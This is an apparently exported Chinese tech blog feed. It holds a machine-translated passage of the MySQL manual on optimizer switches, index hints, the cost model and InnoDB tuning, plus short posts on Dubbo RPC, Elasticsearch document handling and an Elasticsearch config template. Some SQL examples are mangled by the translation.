mrr_cost_based要 off用于要使用的BKA。有关更多信息，请参见 第8.2.1.11节“块嵌套循环和批处理键访问联接”。块嵌套循环标志block_nested_loop（默认 on）控制使用BNL连接算法。有关更多信息，请参见 第8.2.1.11节“块嵌套循环和批处理键访问联接”。条件过滤标志condition_fanout_filter（默认 on）控制条件过滤的使用。派生表合并标志derived_merge（默认 on）控制派生表和视图到外部查询块的合并。该derived_merge标志控制优化程序是否尝试合并派生表并将引用视为外部查询块，假设没有其他规则会阻止合并; 例如，ALGORITHM视图的 指令优先于该derived_merge 设置。 默认情况下，该标志on用于启用合并。有关更多信息，请参见 第8.2.2.3节“优化派生表和视图引用”。引擎状况下推标志engine_condition_pushdown（默认 on）控制发动机状况下推。有关更多信息，请参见 第8.2.1.4节“引擎状况下推优化”。索引条件下推标志index_condition_pushdown（默认 on）控制索引条件下推。有关更多信息，请参见 第8.2.1.5节“索引条件下推优化”。索引扩展标志use_index_extensions（默认 on）控制索引扩展的使用。有关更多信息，请参见 第8.3.9节“使用索引扩展”。索引合并标志index_merge（默认 on）控制所有索引合并优化。index_merge_intersection（默认 on）控制索引合并相交访问优化。index_merge_sort_union（默认 on）控制索引合并排序 - 联合访问优化。index_merge_union（默认 on）控制索引合并联盟访问优化。有关更多信息，请参见 第8.2.1.3节“索引合并优化”。多范围读取标志mrr（默认on）控制多范围读取策略。mrr_cost_based（默认 on）控制使用基于成本的MRR mrr=on。有关更多信息，请参见 第8.2.1.10节“多范围读取优化”。半连接标志semijoin（默认 on）控制所有半连接策略。duplicateweedout（默认 on）控制半联合Duplicate Weedout策略。firstmatch（默认 on）控制半连接的FirstMatch策略。loosescan（默认 on）控制半连接LooseScan策略（不要与LooseScan混淆GROUP BY）。在semijoin， firstmatch，loosescan，和duplicateweedout超过半连接策略的标志使能控制。该semijoin 标志控制是否使用半连接。如果它被设置为 on，在firstmatch和 loosescan标志启用了允许半连接策略更精细的控制。如果duplicateweedout禁用半连接策略，则不会使用半连接策略，除非所有其他适用策略也被禁用。如果semijoin和 materialization是两个 on，半连接也适用使用物化。这些标志是on默认的。有关更多信息，请参见第8.2.2.1节“使用半连接转换优化子查询，派生表和视图引用”。子查询物化标志materialization（默认 on）控制实现（包括半连接实现）。subquery_materialization_cost_based （默认on）使用基于成本的物化选择。该materialization标志控制是否使用子查询实现。如果 semijoin和 materialization是两个 on，半连接也适用使用物化。这些标志是on默认的。该subquery_materialization_cost_based 标志使得能够在子查询物化和之间的选择控制 IN-到- EXISTS子查询变换。如果该标志为on（默认值），优化器进行子查询物化和之间的基于成本的选择 IN-到- EXISTS子查询变换如果可以使用任一方法。如果标志是off，优化器选择了子查询物化 IN至- EXISTS子查询的转变。有关更多信息，请参见 第8.2.2节“优化子查询，派生表和视图引用”。当您为其赋值时 optimizer_switch，未提及的标志会保留其当前值。这样可以在单个语句中启用或禁用特定的优化器行为，而不会影响其他行为。该语句不依赖于其他优化器标志存在以及它们的值是什么。假设启用了所有索引合并优化：MySQL的&gt; SELECT @@optimizer_switch\G*************************** 1. row ******************** *******@@ optimizer_switch：index_merge = on，index_merge_union = on， index_merge_sort_union =开， index_merge_intersection =开， engine_condition_pushdown =开， index_condition_pushdown =开， MRR =开，上mrr_cost_based =， block_nested_loop =开，batched_key_access =关， 物化=开，半连接=上，loosescan =开， firstmatch =开， subquery_materialization_cost_based =开， use_index_extensions =开， condition_fanout_filter =上如果服务器对某些查询使用索引合并联合或索引合并排序联合访问方法，并且您希望检查优化程序在没有它们的情况下是否会更好地执行，请设置变量值，如下所示：MySQL的&gt; SET optimizer_switch=&apos;index_merge_union=off,index_merge_sort_union=off&apos;;MySQL的&gt; SELECT @@optimizer_switch\G*************************** 1. row ******************** *******@@ optimizer_switch：index_merge = on，index_merge_union = off， index_merge_sort_union =关， index_merge_intersection =开， engine_condition_pushdown =开， index_condition_pushdown =开， MRR =开，上mrr_cost_based =， block_nested_loop =开，batched_key_access =关， 物化=开，半连接=上，loosescan =开， firstmatch =开， subquery_materialization_cost_based =开， use_index_extensions =开， condition_fanout_filter =上 8.9.4索引提示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132索引提示为优化程序提供有关如何在查询处理期间选择索引的信息。这里描述的索引提示与第8.9.2节“优化器提示”中描述的 优化器提示不同。索引和优化器提示可以单独使用或一起使用。索引提示是按照表名指定的。（有关在语句中指定表的一般语法 SELECT，请参见 第13.2.9.2节“JOIN语法”。）引用单个表（包括索引提示）的语法如下所示：tbl_name[[AS] alias] [ index_hint_list]index_hint_list： index_hint[ index_hint] ...index_hint： USE &#123;INDEX | KEY&#125; [FOR &#123;JOIN | ORDER BY | GROUP BY&#125;]（[ index_list]） | IGNORE &#123;INDEX | KEY&#125; [FOR &#123;JOIN | ORDER BY | GROUP BY&#125;]（index_list） | FORCE &#123;INDEX | KEY&#125; [FOR &#123;JOIN | ORDER BY | GROUP BY&#125;]（index_list）index_list： index_name[，index_name] ...该提示告诉MySQL只使用其中一个命名索引来查找表中的行。另一种语法告诉MySQL不要使用某些特定的索引或索引。如果显示MySQL使用可能索引列表中的错误索引，这些提示很有用。 USE INDEX (index_list)IGNORE INDEX (index_list)EXPLAIN这个FORCE INDEX提示的作用就像，另外一个表扫描被认为是 非常昂贵的。换句话说，只有在无法使用某个指定索引在表中查找行时才使用表扫描。 USE INDEX (index_list)每个提示都需要索引名称，而不是列名。要引用主键，请使用该名称PRIMARY。要查看表的索引名称，请使用该SHOW INDEX语句或 INFORMATION_SCHEMA.STATISTICS 表。一个index_name值不一定是一个完整的索引名称。它可以是索引名称的明确前缀。如果前缀不明确，则会发生错误。例子：SELECT * FROM table1 USE INDEX（col1_index，col2_index） WH1 col1 = 1 AND col2 = 2 AND col3 = 3;SELECT * FROM table1 IGNORE INDEX（col3_index） WH1 col1 = 1 AND col2 = 2 AND col3 = 3;索引提示的语法具有以下特征：它在语法上是有效的，省略 index_list了USE INDEX，这意味着“ 不使用索引。” 省略index_list的 FORCE INDEX或者IGNORE INDEX是一个语法错误。您可以通过向提示添加FOR子句来指定索引提示的范围 。这提供了对查询处理的各个阶段的执行计划的优化器选择的更细粒度的控制。要仅影响MySQL决定如何在表中查找行以及如何处理连接时使用的索引，请使用FOR JOIN。要影响用于排序或分组行的索引使用情况，请使用FOR ORDER BY或 FOR GROUP BY。您可以指定多个索引提示：SELECT * FROM t1 USE INDEX（i1）IGNORE INDEX FOR ORDER BY（i2）ORDER BY a;在几个提示中命名相同的索引（即使在相同的提示中）也不是错误的：SELECT * FROM t1 USE INDEX（i1）USE INDEX（i1，i1）;但是，它是混合错误USE INDEX 和FORCE INDEX同一个表：SELECT * FROM t1 USE INDEX FOR JOIN（i1）FORCE INDEX FOR JOIN（i2）;如果索引提示不包含FOR子句，则提示的范围将应用于语句的所有部分。例如，这个提示：IGNORE INDEX（i1）相当于这种提示的组合：IGNORE索引加入（i1）IGNORE索引（ORDER BY）（i1）IGNORE INDEX FOR GROUP BY（i1）在MySQL 5.0中，不带FOR子句的提示范围仅适用于行检索。当不存在FOR子句时，要使服务器使用此旧行为，请old在服务器启动时启用系统变量。注意在复制设置中启用此变量。使用基于语句的二进制日志记录时，主服务器和从服务器使用不同的模式可能会导致复制错误。当索引提示进行处理，它们是由式（收集在一个单一的列表USE，FORCE， IGNORE）和范围（FOR JOIN，FOR ORDER BY，FOR GROUP BY）。例如：SELECT * FROM t1 USE INDEX（）IGNORE INDEX（i2）USE INDEX（i1）USE INDEX（i2）;相当于：SELECT * FROM t1 USE INDEX（i1，i2）IGNORE INDEX（i2）;索引提示然后按以下顺序应用于每个范围：&#123;USE|FORCE&#125; INDEX如果存在，则应用。（如果不是，则使用优化程序确定的一组索引。）IGNORE INDEX应用于上一步的结果。例如，以下两个查询是等同的：SELECT * FROM t1 USE INDEX（i1）IGNORE INDEX（i2）USE INDEX（i2）;SELECT * FROM t1 USE INDEX（i1）;对于FULLTEXT搜索，索引提示的工作如下：对于自然语言模式搜索，索引提示将被忽略。例如，IGNORE INDEX(i1)在没有警告的情况下被忽略，索引仍然被使用。对于布尔模式搜索，带有FOR ORDER BY或者的索引提示FOR GROUP BY默默忽略。带有FOR JOIN或不带FOR修饰符的索引提示将得到遵守。与提示如何应用于非FULLTEXT搜索相反，该提示用于查询执行的所有阶段（查找行和检索，分组和排序）。即使给出非FULLTEXT索引的提示，也是如此。例如，以下两个查询是等同的：SELECT * FROM t USE INDEX（index1） IGNORE INDEX（index1）用于ORDER BY IGNORE INDEX（index1）适用于GROUP BY 在......布尔模式中......;SELECT * FROM t USE INDEX（index1） 在......布尔模式中......; 8.9.5优化器成本模型 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205为了生成执行计划，优化器使用基于对查询执行期间发生的各种操作的成本进行估计的成本模型。优化器具有一组可编辑的默认“ 成本常量 ”，可用于制定有关执行计划的决策。优化器还具有执行计划构建过程中使用的成本估算数据库。这些估计值存储在中server_cost和 engine_cost在表 mysql系统数据库中，随时可配置的。这些表的目的是使它能够轻松调整优化器在尝试到达查询执行计划时使用的成本估计。成本模型一般操作成本模型数据库对成本模型数据库进行更改成本模型一般操作可配置的优化器成本模型如下所示：服务器在启动时将成本模型表读入内存，并在运行时使用内存中的值。NULL表中指定的任何非成本估算优先于相应的编译缺省成本常数。任何NULL 估计都会向优化器指示使用编译的默认值。在运行时，服务器可能重新读取成本表。当存储引擎动态加载或FLUSH OPTIMIZER_COSTS 执行语句时会发生这种情况。成本表使服务器管理员能够通过更改表中的条目来轻松调整成本估算。通过将条目的成本设置为，也很容易恢复为默认值NULL。优化程序使用内存中的开销值，因此对表的更改应随后FLUSH OPTIMIZER_COSTS生效。当客户端会话开始时，当前内存中的成本估算适用于整个会话，直到它结束。特别是，如果服务器重新读取成本表格，则任何更改的估算值仅适用于随后开始的会话。现有会话不受影响。成本表特定于给定的服务器实例。服务器不会将成本表更改复制到复制从服务器。成本模型数据库优化器成本模型数据库由mysql系统数据库中的两个表组成，其中包含查询执行期间发生的操作的成本估算信息：server_cost：一般服务器操作的优化器成本估算engine_cost：特定于特定存储引擎的操作的优化器成本估算该server_cost表包含这些列：cost_name成本模型中使用的成本估算的名称。名称不区分大小写。如果服务器在读取此表时未识别成本名称，则会向错误日志写入警告。cost_value成本估算值。如果该值不是NULL，则服务器将其用作成本。否则，它使用默认估计值（编译值）。DBA可以通过更新此列来更改成本估算。如果服务器在读取此表时发现成本值无效（非正确），则会向错误日志写入警告。要覆盖默认成本估算（对于指定的条目NULL），请将成本设置为非NULL值。要恢复为默认值，请将该值设置为NULL。然后执行FLUSH OPTIMIZER_COSTS以通知服务器重新读取成本表。last_update最后一行更新的时间。comment与成本估算相关的描述性评论。DBA可以使用此列来提供有关成本估算行为何存储特定值的信息。该server_cost表的主键是cost_name列，因此不可能为任何成本估算创建多个条目。服务器识别这些表的cost_name 值server_cost：disk_temptable_create_cost（默认40.0），disk_temptable_row_cost（默认1.0）存储在基于磁盘的存储引擎（InnoDB或者MyISAM）中的内部创建的临时表的成本估算 。增加这些值会增加使用内部临时表的成本估计值，并使优化程序偏好使用较少的查询计划。有关这些表的信息，请参见 第8.4.4节“MySQL中的内部临时表使用”。与相应内存参数（memory_temptable_create_cost， memory_temptable_row_cost）的默认值相比， 这些磁盘参数的较大默认值反映了处理基于磁盘的表的较高成本。key_compare_cost （默认0.1）比较记录密钥的成本。增加此值会导致查询计划比较许多密钥变得更加昂贵。例如，filesort与避免使用索引进行排序的查询计划相比，执行a的查询计划 变得相对昂贵。memory_temptable_create_cost（默认2.0），memory_temptable_row_cost （默认0.2）存储在MEMORY存储引擎中的内部创建的临时表的成本估算。增加这些值会增加使用内部临时表的成本估计值，并使优化程序偏好使用较少的查询计划。有关这些表的信息，请参见 第8.4.4节“MySQL中的内部临时表使用”。与相应磁盘参数（disk_temptable_create_cost， disk_temptable_row_cost）的默认值相比， 这些内存参数的较小默认值反映了处理基于内存的表的较低成本。row_evaluate_cost （默认0.2）评估记录条件的成本。与查询更少行的查询计划相比，增加此值会导致查询计划检查许多行变得更加昂贵。例如，与读取较少行的范围扫描相比，表扫描变得相对昂贵。该engine_cost表包含这些列：engine_name此成本估算适用的存储引擎的名称。名称不区分大小写。如果值是 default，则它适用于所有没有自己的命名条目的存储引擎。如果服务器在读取此表时未识别引擎名称，则会向错误日志写入警告。device_type此成本估算适用的设备类型。该列旨在为不同的存储设备类型指定不同的成本估算，例如硬盘驱动器与固态驱动器。目前，该信息未被使用，0是唯一允许的值。cost_name与server_cost表中相同。cost_value与server_cost表中相同。last_update与server_cost表中相同。comment与server_cost表中相同。对于主键engine_cost表是包含（一个元组cost_name， engine_name， device_type）个列，所以它不可能在这些列中的值的任意组合来创建多个条目。服务器识别这些表的cost_name 值engine_cost：io_block_read_cost （默认1.0）从磁盘读取索引或数据块的成本。与增加此值的查询计划相比，读取许多磁盘块的查询计划与读取更少磁盘块的查询计划相比变得更加昂贵。例如，与读取较少块的范围扫描相比，表扫描变得相对昂贵。memory_block_read_cost （默认1.0）与io_block_read_cost内存数据库缓冲区中的索引或数据块的读取相似，但代表了其成本。如果io_block_read_cost和 memory_block_read_cost值不同，则执行计划可能会在相同查询的两次运行之间更改。假设内存访问的成本低于磁盘访问的成本。在这种情况下，在数据读入缓冲池之前的服务器启动时，您可能会得到与查询运行后不同的计划，因为这样数据将存储在内存中。对成本模型数据库进行更改对于希望从其默认值更改成本模型参数的DBA，请尝试将值加倍或减半并测量结果。对参数io_block_read_cost和 memory_block_read_cost参数的更改最有可能产生有价值的结果。这些参数值使数据访问方法的成本模型能够考虑从不同来源读取信息的成本; 即从磁盘读取信息与读取存储器缓冲区中已有信息的成本。例如，所有其他条件相同，将io_block_read_cost值设置 为大于memory_block_read_cost优先级的值 会使优化器更喜欢查询计划，该计划将内存中已保存的信息读取到必须从磁盘读取的计划中。此示例显示如何更改以下内容的默认值 io_block_read_cost：更新mysql.engine_cost SET cost_value = 2.0 WHERE cost_name =&apos;io_block_read_cost&apos;;FLUSH OPTIMIZER_COSTS;此示例显示如何io_block_read_cost仅 更改InnoDB存储引擎的值 ：INSERT INTO mysql.engine_cost VALUES（&apos;InnoDB&apos;，0，&apos;io_block_read_cost&apos;，3.0， CURRENT_TIMESTAMP，&apos;为InnoDB使用较慢的磁盘&apos;）;FLUSH OPTIMIZER_COSTS;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dubbo分析]]></title>
    <url>%2F2018%2F03%2F24%2Frpc%2Fdubbo-1%2F</url>
    <content type="text"><![CDATA[1手册地址:https://gitee.com/none_heart/RPC/raw/master/dubbo/doc/dubbo-用户指南-带标签.pdf RPC Remote Procedure call 远程过程调用 一个RPC框架有几个特点:远程调用.协议.暴露端口方式稳定性.一致性.容错性并发性.简单插入性.高度解耦 那么从这几个方面来思考dubbo 协议:1234567891011Dubbo缺省协议采用单一长连接和NIO异步通讯，适合于小数据量大并发的服务调用，以及服务消费者机器数远大于服务提供者机器数的情况。缺省协议，使用基于mina1.1.7+hessian3.2.1的tbremoting交互。连接个数：单连接连接方式：长连接传输协议：TCP传输方式：NIO异步传输序列化：Hessian二进制序列化适用范围：传入传出参数数据包较小（建议小于100K），消费者比提供者个数多，单一消费者无法压满提供者，尽量不要用dubbo协议传输大文件或超大字符串。适用场景：常规远程服务方法调用 高可用-容错性: 五种回调方式:Failover.Failfast.Failsafe.Failback.Forking应对不同场景使用不同回调方式 高可用-负载均衡dubbo支持 随机.轮询.最小调用次数调用.hash值余数调用 并发-线程没什么可说的.该用就得用.但是不能乱用. 服务暴露地址:多协议.多注册方式.无中心化 参数校验.服务分组等等]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>dubbo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch内部存储执行机制]]></title>
    <url>%2F2018%2F03%2F24%2Fsearch-engine%2Felasticsearch-1%2F</url>
    <content type="text"><![CDATA[新建、索引和删除单个文档 以下是在主副分片和任何副本分片上面成功新建，索引和删除文档所需要的步骤顺序： 客户端向 Node 1 发送新建、索引或者删除请求。 节点使用文档的 _id 确定文档属于分片 0 。请求会被转发到 Node 3，因为分片 0 的主分片目前被分配在 Node 3 上。 Node 3 在主分片上面执行请求。如果成功了，它将请求并行转发到 Node 1 和 Node 2 的副本分片上。一旦所有的副本分片都报告成功, Node 3 将向协调节点报告成功，协调节点向客户端报告成功。 在客户端收到成功响应时，文档变更已经在主分片和所有副本分片执行完成，变更是安全的。 取回单个文档 以下是从主分片或者副本分片检索文档的步骤顺序： 1、客户端向 Node 1 发送获取请求2、节点使用文档的 _id 来确定文档属于分片 0 。分片 0 的副本分片存在于所有的三个节点上。 在这种情况下，它将请求转发到 Node 23、Node 2 将文档返回给 Node 1 ，然后将文档返回给客户端。 在处理读取请求时，协调结点在每次请求的时候都会通过轮询所有的副本分片来达到负载均衡 局部更新文档 以下是部分更新一个文档的步骤： 客户端向 Node 1 发送更新请求。 它将请求转发到主分片所在的 Node 3 。 Node 3 从主分片检索文档，修改 _source 字段中的 JSON ，并且尝试重新索引主分片的文档。 如果文档已经被另一个进程修改，它会重试步骤 3 ，超过 retry_on_conflict 次后放弃。 如果 Node 3 成功地更新文档，它将新版本的文档并行转发到 Node 1 和 Node 2 上的副本分片，重新建立索引。 一旦所有副本分片都返回成功， Node 3 向协调节点也返回成功，协调节点向客户端返回成功。 update API 还接受在 新建、索引和删除文档 章节中介绍的 routing 、 replication 、 consistency 和 timeout 参数。 使用 mget 取回多个文档 以下是使用单个 mget 请求取回多个文档所需的步骤顺序： 客户端向 Node 1 发送 mget 请求。 Node 1 为每个分片构建多文档获取请求，然后并行转发这些请求到托管在每个所需的主分片或者副本分片的节点上。一旦收到所有答复， Node 1 构建响应并将其返回给客户端。 可以对 docs 数组中每个文档设置 routing 参数。 使用 bulk 修改多个文档 bulk API按如下步骤顺序执行： 客户端向 Node 1 发送 bulk 请求。 Node 1 为每个节点创建一个批量请求，并将这些请求并行转发到每个包含主分片的节点主机。 主分片一个接一个按顺序执行每个操作。当每个操作成功时，主分片并行转发新文档（或删除）到副本分片，然后执行下一个操作。 一旦所有的副本分片报告所有操作成功，该节点将向协调节点报告成功，协调节点将这些响应收集整理并返回给客户端。 bulk API 还可以在整个批量请求的最顶层使用 consistency 参数，以及在每个请求中的元数据中使用 routing 参数。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[elasticsearch-config]]></title>
    <url>%2F2018%2F03%2F24%2Fsearch-engine%2Felasticsearch-config%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# ---------------------------------- Cluster -----------------------------------## 为群集使用描述性名称:##cluster.name: my-application## ------------------------------------ Node ------------------------------------##为节点使用描述性名称:##node.name: node-1## 向节点添加自定义属性:##node.attr.rack: r1## ----------------------------------- Paths ------------------------------------## 路径到目录存储数据的位置 (用逗号分隔多个位置):##path.data: /path/to/data## 日志文件的路径:##path.logs: /path/to/logs## ----------------------------------- Memory -----------------------------------## 启动时锁定内存:##bootstrap.memory_lock: true##确保堆大小设置为大约一半的可用内存在系统上, 并且允许进程的所有者使用此限制。## 当系统交换内存时, Elasticsearch 执行得很差。## ---------------------------------- Network -----------------------------------## 将绑定地址设置为特定 IP (IPv4 或 IPv6):##network.host: 192.168.0.1## 为 HTTP 设置自定义端口:##http.port: 9200## 有关详细信息, 请参阅网络模块文档。## --------------------------------- Discovery ----------------------------------## 在启动新节点时传递初始主机列表以执行发现:# 主机的默认列表为 [ &quot;127.0.0.1 &quot;, [:: 1] &quot;]##discovery. zen.ping.unicast.hosts: [ &quot;host1 &quot;, &quot;host2 &quot;]## 通过配置大多数节点 (主合格节点总数/2 + 1) 来防止 &quot;分裂大脑 &quot;:##discovery.zen.minimum_master_nodes:### ---------------------------------- Gateway -----------------------------------## 在完全群集重新启动后阻止初始恢复, 直到开始 N 个节点:##gateway.recover_after_nodes: 3### ---------------------------------- Various -----------------------------------## 删除索引时需要显式名称:##action.destructive_requires_name: true]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>search-engine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【InnoDB-表优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-innodb%2F</url>
    <content type="text"><![CDATA[innodb表优化 8.5.1优化InnoDB表的存储布局12345678910111213141516171819202122232425262728293031一旦数据达到稳定的大小，或者增长表增加了几十或几百兆字节，请考虑使用该OPTIMIZE TABLE语句来重新组织表并压缩任何浪费的空间。重新组织的表需要更少的磁盘I / O来执行全表扫描。当其他技术（如改进索引使用或调整应用程序代码）不切实际时，这是一种直接技术，可以提高性能。OPTIMIZE TABLE复制表格的数据部分并重建索引。好处来自改进索引内数据的打包，并减少表空间和磁盘内的碎片。好处取决于每个表中的数据。您可能会发现某些人有显着的收益，而不是其他人，或者收益会随着时间的推移而下降，直到您再次优化表。如果表很大或者重建的索引不适合缓冲池，则此操作可能会很慢。向表中添加大量数据后的第一次运行通常比后期运行慢得多。在中InnoDB，有一个很长的PRIMARY KEY（无论是一个长的值的单个列，还是多个形成一个长复合值的列）浪费了大量的磁盘空间。一行中的主键值在所有指向同一行的二级索引记录中都是重复的。（请参见第14.8.2.1节“集群索引和二级索引”。）AUTO_INCREMENT如果主键很长，或者索引长VARCHAR列的前缀而不是整列，则创建一个列作为主键。使用VARCHAR数据类型而不是CHAR存储可变长度的字符串或具有多个NULL值的列 。甲 列总是占据字符来存储数据，即使该字符串是较短，或者其值 。较小的表适合缓冲池，并减少磁盘I / O。 CHAR(N)NNULL使用COMPACT行格式（默认InnoDB格式）和可变长度字符集（如 utf8或）时sjis， 列占用可变数量的空间，但仍至少为字节。 CHAR(N)N对于大的表或者包含大量重复的文本或数字数据的表，请考虑使用 COMPRESSED行格式。将数据带入缓冲池或执行全表扫描需要较少的磁盘I / O。在做出永久性决定之前，请测量使用行格式COMPRESSED与 您可以实现的压缩量 COMPACT。 8.5.2优化InnoDB事务管理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061要优化InnoDB事务处理，请在事务功能的性能开销和服务器的工作负载之间找到理想的平衡点。例如，如果应用程序每秒提交数千次，则应用程序可能会遇到性能问题，如果应用程序每2-3小时提交一次，则会出现不同的性能问题。默认的MySQL设置AUTOCOMMIT=1 可能会对繁忙的数据库服务器造成性能限制。在可行的情况下，在进行所有更改后，通过发布SET AUTOCOMMIT=0或START TRANSACTION声明将几个相关的数据更改操作包括到单个事务中 ，然后包含 COMMIT声明。InnoDB如果该事务对数据库进行了修改，则必须在每次事务提交时将日志刷新到磁盘。当每次更改之后都进行提交（与默认的自动提交设置一样）时，存储设备的I / O吞吐量会对每秒潜在操作的数量设置上限。或者，对于仅由单个SELECT语句组成的事务，开启AUTOCOMMIT有助于 InnoDB识别只读事务并优化它们。有关要求，请参见 第8.5.3节“优化InnoDB只读事务”。避免在插入，更新或删除大量行后执行回滚。如果一个大事务正在降低服务器的性能，那么回滚会导致问题变得更糟，可能需要几次才能执行原始数据更改操作。杀死数据库进程无济于事，因为在服务器启动时会再次开始回滚。为了尽量减少发生此问题的机会：增加缓冲池的大小， 以便可以缓存所有数据更改更改，而不是立即写入磁盘。设置 innodb_change_buffering=all 以便更新和删除操作在插入之外进行缓冲。考虑COMMIT在大数据更改操作期间定期发布语句，可能会将单个删除或更新分为多个在较少数量的行上操作的语句。为避免出现失控回滚，请增加缓冲池，以便回滚变为受CPU限制且运行速度很快，或者innodb_force_recovery=3按照第14.18.2节“InnoDB恢复”中的说明关闭服务器并重新启动 。预计这个问题很少出现在默认设置下 innodb_change_buffering=all，这样可以将更新和删除操作缓存到内存中，从而使它们在第一时间执行得更快，并且如果需要还可以更快地回滚。确保在处理长时间运行事务的服务器上使用此参数设置，并进行多次插入，更新或删除操作。如果发生崩溃时可以承受某些最新已提交事务的丢失，则可以将该innodb_flush_log_at_trx_commit 参数设置 为0. InnoDB尽管无法保证刷新，但试图每秒刷新一次日志。另外，将值设置 innodb_support_xa为0，这将减少由于在磁盘数据和二进制日志上同步而导致的磁盘刷新次数。注意innodb_support_xa已弃用，将在未来版本中删除。从MySQL 5.7.10开始，InnoDB对XA事务中的两阶段提交的支持始终处于启用状态，并且innodb_support_xa不再允许禁用 。当行被修改或删除时，行和关联的 撤消日志不会立即被物理删除，甚至在事务提交后立即被删除。保留旧数据，直到完成较早或同时开始的事务，以便这些事务可以访问修改行或已删除行的先前状态。因此，长时间运行的事务可以防止InnoDB清除不同事务更改的数据。当在长时间运行的事务中修改或删除行时，使用READ COMMITTED和 REPEATABLE READ隔离级别的其他事务在 读取相同行时必须执行更多工作才能重新构建旧数据。当长时间运行的事务修改表时，其他事务对该表的查询不使用覆盖索引技术。通常可以从辅助索引中检索所有结果列的查询，而是从表格数据中查找适当的值。如果发现二级索引页面 PAGE_MAX_TRX_ID太新，或者二级索引中的记录被删除标记，则 InnoDB可能需要使用聚簇索引查找记录。 8.5.3优化InnoDB只读事务1234567891011121314151617181920212223242526272829303132InnoDB可以避免与为已知为只读的事务设置事务ID（TRX_ID字段）相关联的开销。只有可能执行写入操作或锁定读取的事务才需要事务ID ， 例如 。消除不必要的事务ID会减少每次查询或数据更改语句构造读取视图时查阅的内部数据结构的大小。 SELECT ... FOR UPDATEInnoDB 在以下情况下检测只读事务：交易以START TRANSACTION READ ONLY声明开始 。在这种情况下，尝试更改数据库（for InnoDB， MyISAM或其他类型的表）会导致错误，并且事务以只读状态继续：错误1792（25006）：无法在READ ONLY事务中执行语句。您仍然可以在只读事务中更改特定于会话的临时表，或者为它们发出锁定查询，因为这些更改和锁对任何其他事务都不可见。该autocommit设置处于打开状态，以便事务保证为单个语句，构成事务的单个语句为“ 非锁定 ” SELECT语句。也就是说 SELECT，它不使用一个FOR UPDATE或一个LOCK IN SHARED MODE 子句。事务在没有READ ONLY选项的情况下启动，但没有显式锁定行的更新或语句已经执行。在需要更新或显式锁定之前，事务处于只读模式。因此，对于读取密集型应用，如报表生成器，您可以调整的序列，InnoDB 由内而外将它们分组查询 START TRANSACTION READ ONLY和 COMMIT， 或通过打开autocommit 运行之前设置SELECT语句，或简单地避免与查询穿插任何数据更改语句。有关信息 START TRANSACTION，并 autocommit请参见 13.3.1节，“START TRANSACTION，COMMIT和ROLLBACK语法”。注意具有自动提交，非锁定和只读（AC-NL-RO）资格的事务处于特定内部 InnoDB数据结构之外，因此未在SHOW ENGINE INNODB STATUS输出中列出 。 8.5.4优化InnoDB重做日志12345678910111213141516171819202122232425262728293031323334353637383940414243考虑以下关于优化重做日志的指导原则：使您的重做日志文件变大，甚至与缓冲池一样大 。当 InnoDB写完重做日志文件时，它必须将检查点中缓冲池的修改内容写入磁盘 。 小的重做日志文件导致许多不必要的磁盘写入。虽然历史上重要的重做日志文件会导致冗长的恢复时间，但现在恢复速度更快， 您可以放心地使用大型重做日志文件。重做日志文件的大小和数量使用innodb_log_file_size 和 innodb_log_files_in_group 配置选项进行配置。 有关修改现有重做日志文件配置的信息，请参见 第14.7.2节“更改InnoDB重做日志文件的数量或大小”。考虑增加日志缓冲区的大小 。大型日志缓冲区允许大型 事务运行，而无需在事务提交之前将日志写入磁盘。 因此，如果您有更新，插入或删除多行的事务，则使日志缓冲区更大可节省磁盘I / O。 日志缓冲区大小使用innodb_log_buffer_size 配置选项进行 配置。配置 innodb_log_write_ahead_size 配置选项以避免“ 读写 ”。该选项定义重做日志的预写块大小。 设置 innodb_log_write_ahead_size 为匹配操作系统或文件系统缓存块大小。 由于重做日志的预写块大小与操作系统或文件系统高速缓存块大小之间的不匹配， 重做日志块未完全缓存到操作系统或文件系统时发生了写入时读写。有效值 innodb_log_write_ahead_size 是InnoDB日志文件块大小（2 n）的倍数。最小值是InnoDB日志文件块大小（512）。 指定最小值时不发生预写。最大值等于该 innodb_page_size值。 如果您指定的值 innodb_log_write_ahead_size 大于该 innodb_page_size值，则该 innodb_log_write_ahead_size 设置将被截断为该 innodb_page_size值。innodb_log_write_ahead_size 相对于操作系统或文件系统缓存块大小 设置 值太低会导致写入时读写。fsync由于一次写入多个块，因此将值设置得过高可能会对日志文件写入的性能产生轻微影响 。 8.5.5 InnoDB表的批量数据加载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869这些性能提示补充了第8.2.4.1节“优化INSERT语句”中有关快速插入的一般准则。将数据导入时InnoDB，请关闭自动提交模式，因为它会为每个插入操作执行日志刷新到磁盘。为了您的导入操作过程中禁用自动提交，与环绕它 SET autocommit和 COMMIT语句：SET autocommit = 0;... SQL import statements ...承诺;该mysqldump的选项 --opt创建这样的快速导入到转储文件InnoDB 表，即使没有与他们包装 SET autocommit和 COMMIT报表。如果您UNIQUE对辅助键有限制，可以通过在导入会话期间暂时关闭唯一性检查来加快表导入的速度：SET unique_checks = 0;... SQL import statements ...SET unique_checks = 1;对于大表而言，这可以节省大量的磁盘I / O，因为 InnoDB可以使用其更改缓冲区来批量写入二级索引记录。确保数据不包含重复的密钥。如果您FOREIGN KEY的表中存在约束，则可以通过在导入会话期间关闭外键检查来加速表导入：SET foreign_key_checks = 0;... 